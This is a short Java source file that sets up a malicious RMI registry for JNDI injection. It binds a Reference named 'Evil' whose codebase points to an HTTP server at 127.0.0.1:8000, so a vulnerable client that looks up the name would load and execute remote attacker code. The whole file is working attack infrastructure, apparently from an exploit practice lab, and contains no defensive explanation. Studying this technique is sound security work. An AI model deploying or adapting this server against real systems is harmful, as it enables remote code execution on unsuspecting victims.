package org.example;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import com.sun.org.apache.regexp.internal.RE;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIRMIServer {
    public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {
        String url = "http://127.0.0.1:8000/";
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("Evil","Evil",url);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Evil",referenceWrapper);
    }
}
